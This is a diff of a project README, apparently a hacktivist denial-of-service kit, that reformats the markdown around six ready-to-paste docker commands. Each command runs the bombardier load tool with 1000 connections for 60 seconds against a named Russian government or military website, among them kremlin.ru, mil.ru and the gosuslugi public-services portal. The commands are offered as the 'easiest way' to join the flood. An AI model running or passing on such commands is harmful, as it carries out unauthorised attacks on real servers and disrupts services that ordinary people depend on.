@@ -7,18 +7,17 @@ From local PC `./run_all_docker.sh`
 <br>
 or easiest way 
 
-`docker run -ti --rm alpine/bombardier -c 1000 -d 60s -l http://kremlin.ru
+`docker run -ti --rm alpine/bombardier -c 1000 -d 60s -l http://kremlin.ru`
 <br>
-docker run -ti --rm alpine/bombardier -c 1000 -d 60s -l https://mil.ru
+`docker run -ti --rm alpine/bombardier -c 1000 -d 60s -l https://mil.ru`
 <br>
-docker run -ti --rm alpine/bombardier -c 1000 -d 60s -l http://www.scrf.gov.ru
+`docker run -ti --rm alpine/bombardier -c 1000 -d 60s -l http://www.scrf.gov.ru`
 <br>
-docker run -ti --rm alpine/bombardier -c 1000 -d 60s -l https://ach.gov.ru
+`docker run -ti --rm alpine/bombardier -c 1000 -d 60s -l https://ach.gov.ru`
 <br>
-docker run -ti --rm alpine/bombardier -c 1000 -d 60s -l https://epp.genproc.gov.ru
+`docker run -ti --rm alpine/bombardier -c 1000 -d 60s -l https://epp.genproc.gov.ru`
 <br>
-docker run -ti --rm alpine/bombardier -c 1000 -d 60s -l https://www.gosuslugi.ru
-`
+`docker run -ti --rm alpine/bombardier -c 1000 -d 60s -l https://www.gosuslugi.ru`
 
 <br>
 sites
